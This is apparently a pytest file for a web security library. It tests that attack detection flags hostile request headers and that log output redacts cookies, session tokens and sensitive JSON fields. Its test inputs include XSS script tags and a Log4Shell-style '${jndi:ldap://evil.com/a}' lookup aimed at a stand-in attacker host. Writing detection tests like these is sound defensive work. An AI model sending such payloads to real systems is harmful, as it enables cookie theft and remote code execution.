import json
import logging

import pytest

from guard_core.models import SyncSecurityConfig
from guard_core.sync.handlers.suspatterns_handler import sus_patterns_handler
from guard_core.sync.utils import (
    _DEFAULT_SENSITIVE_LOG_HEADERS,
    _merge_sensitive_log_headers,
    _resolve_sensitive_log_headers,
    detect_penetration_attempt,
)
from tests.test_sync.conftest import SyncMockGuardRequest


@pytest.fixture(autouse=True)
def _force_enhanced_detection_singleton() -> None:
    sus_patterns_handler.configure(SyncSecurityConfig())


def test_default_sensitive_cookie_header_redacted_with_extra_config(
    caplog: pytest.LogCaptureFixture,
) -> None:
    config = SyncSecurityConfig(log_sensitive_headers={"x-session"})
    request = SyncMockGuardRequest(
        headers={
            "Cookie": (
                "session=sk-SECRET-COOKIE; xss=<script>alert(document.cookie)</script>"
            )
        },
    )

    with caplog.at_level(logging.WARNING, logger="guard_core"):
        result = detect_penetration_attempt(request, config)

    assert result.is_threat is True
    lines = [
        line for line in caplog.text.splitlines() if "Potential attack detected" in line
    ]
    assert lines, "no detection log line captured"
    assert "[REDACTED]" in lines[0]
    assert "header 'Cookie'" in lines[0]
    assert "sk-SECRET-COOKIE" not in caplog.text


def test_custom_sensitive_header_redacted_via_log_sensitive_headers_config(
    caplog: pytest.LogCaptureFixture,
) -> None:
    config = SyncSecurityConfig(log_sensitive_headers={"x-session"})
    request = SyncMockGuardRequest(
        headers={"X-Session": "tok-SECRET2 <script>alert(1)</script>"},
    )

    with caplog.at_level(logging.WARNING, logger="guard_core"):
        result = detect_penetration_attempt(request, config)

    assert result.is_threat is True
    lines = [
        line for line in caplog.text.splitlines() if "Potential attack detected" in line
    ]
    assert lines, "no detection log line captured"
    assert "[REDACTED]" in lines[0]
    assert "header 'X-Session'" in lines[0]
    assert "tok-SECRET2" not in caplog.text


def test_non_sensitive_header_value_still_logged_verbatim(
    caplog: pytest.LogCaptureFixture,
) -> None:
    config = SyncSecurityConfig(log_sensitive_headers={"x-session"})
    request = SyncMockGuardRequest(headers={"X-Custom": "<script>alert(1)</script>"})

    with caplog.at_level(logging.WARNING, logger="guard_core"):
        result = detect_penetration_attempt(request, config)

    assert result.is_threat is True
    assert "<script>alert(1)</script>" in caplog.text


def test_non_sensitive_excluded_header_value_still_logged_verbatim(
    caplog: pytest.LogCaptureFixture,
) -> None:
    config = SyncSecurityConfig(log_sensitive_headers={"x-session"})
    request = SyncMockGuardRequest(
        headers={"User-Agent": "${jndi:ldap://evil.com/a}"},
    )

    with caplog.at_level(logging.WARNING, logger="guard_core"):
        result = detect_penetration_attempt(request, config)

    assert result.is_threat is True
    assert "jndi:ldap" in caplog.text


_HEADER_XSS_PAYLOAD = "<script>alert(1)</script>"


def test_non_sensitive_header_embedded_json_sensitive_field_redacted(
    caplog: pytest.LogCaptureFixture,
) -> None:
    config = SyncSecurityConfig()
    payload = json.dumps({"password": _HEADER_XSS_PAYLOAD, "note": "benign"})
    request = SyncMockGuardRequest(headers={"X-Custom": payload})

    with caplog.at_level(logging.WARNING, logger="guard_core"):
        result = detect_penetration_attempt(request, config)

    assert result.is_threat is True
    lines = [
        line for line in caplog.text.splitlines() if "Potential attack detected" in line
    ]
    assert lines, "no detection log line captured"
    assert "[REDACTED]" in lines[0]
    assert _HEADER_XSS_PAYLOAD not in caplog.text


def test_non_sensitive_header_embedded_json_sibling_secret_stays_redacted(
    caplog: pytest.LogCaptureFixture,
) -> None:
    config = SyncSecurityConfig()
    secret = "PASSWORD-SIBLING-SECRET"
    payload = json.dumps({"password": secret, "note": _HEADER_XSS_PAYLOAD})
    request = SyncMockGuardRequest(headers={"X-Custom": payload})

    with caplog.at_level(logging.WARNING, logger="guard_core"):
        result = detect_penetration_attempt(request, config)

    assert result.is_threat is True
    lines = [
        line for line in caplog.text.splitlines() if "Potential attack detected" in line
    ]
    assert lines, "no detection log line captured"
    assert "[REDACTED]" in lines[0]
    assert _HEADER_XSS_PAYLOAD in lines[0]
    assert secret not in caplog.text


def test_non_sensitive_header_embedded_json_custom_sensitive_field_redacted(
    caplog: pytest.LogCaptureFixture,
) -> None:
    config = SyncSecurityConfig(log_sensitive_body_fields={"custom_secret"})
    payload = json.dumps({"custom_secret": _HEADER_XSS_PAYLOAD, "note": "benign"})
    request = SyncMockGuardRequest(headers={"X-Custom": payload})

    with caplog.at_level(logging.WARNING, logger="guard_core"):
        result = detect_penetration_attempt(request, config)

    assert result.is_threat is True
    lines = [
        line for line in caplog.text.splitlines() if "Potential attack detected" in line
    ]
    assert lines, "no detection log line captured"
    assert "[REDACTED]" in lines[0]
    assert _HEADER_XSS_PAYLOAD not in caplog.text


def test_sensitive_header_with_log_suspicious_level_none_emits_no_detection_line(
    caplog: pytest.LogCaptureFixture,
) -> None:
    config = SyncSecurityConfig(
        log_sensitive_headers={"x-session"}, log_suspicious_level=None
    )
    request = SyncMockGuardRequest(
        headers={"X-Session": "tok-SECRET3 <script>alert(1)</script>"},
    )

    with caplog.at_level(logging.WARNING, logger="guard_core"):
        result = detect_penetration_attempt(request, config)

    assert result.is_threat is True
    assert "Potential attack detected" not in caplog.text
    assert "tok-SECRET3" not in caplog.text


def test_config_none_uses_default_sensitive_header_set(
    caplog: pytest.LogCaptureFixture,
) -> None:
    request = SyncMockGuardRequest(
        headers={
            "Cookie": (
                "session=sk-SECRET-COOKIE4; xss=<script>alert(document.cookie)</script>"
            )
        },
    )

    with caplog.at_level(logging.WARNING, logger="guard_core"):
        result = detect_penetration_attempt(request, None)

    assert result.is_threat is True
    assert "[REDACTED]" in caplog.text
    assert "header 'Cookie'" in caplog.text
    assert "sk-SECRET-COOKIE4" not in caplog.text


def test_excluded_header_branch_sensitive_referer_redacted(
    caplog: pytest.LogCaptureFixture,
) -> None:
    config = SyncSecurityConfig(log_sensitive_headers={"referer"})
    request = SyncMockGuardRequest(headers={"Referer": "${jndi:ldap://evil.com/a}"})

    with caplog.at_level(logging.WARNING, logger="guard_core"):
        result = detect_penetration_attempt(request, config)

    assert result.is_threat is True
    assert "[REDACTED]" in caplog.text
    assert "header 'Referer'" in caplog.text
    assert "jndi:ldap" not in caplog.text


def test_sensitive_header_benign_value_not_detected() -> None:
    config = SyncSecurityConfig(log_sensitive_headers={"x-session"})
    request = SyncMockGuardRequest(headers={"X-Session": "tok-BENIGN"})

    result = detect_penetration_attempt(request, config)

    assert result.is_threat is False


def test_merge_sensitive_log_headers_none_returns_default() -> None:
    assert _merge_sensitive_log_headers(None) == _DEFAULT_SENSITIVE_LOG_HEADERS


def test_merge_sensitive_log_headers_extra_merges_lowercased() -> None:
    result = _merge_sensitive_log_headers(frozenset({"X-Session"}))
    assert result == _DEFAULT_SENSITIVE_LOG_HEADERS | {"x-session"}


def test_resolve_sensitive_log_headers_config_none_returns_default() -> None:
    assert _resolve_sensitive_log_headers(None) == _DEFAULT_SENSITIVE_LOG_HEADERS


def test_resolve_sensitive_log_headers_with_config_extras() -> None:
    config = SyncSecurityConfig(log_sensitive_headers={"x-session"})
    result = _resolve_sensitive_log_headers(config)
    assert result == _DEFAULT_SENSITIVE_LOG_HEADERS | {"x-session"}
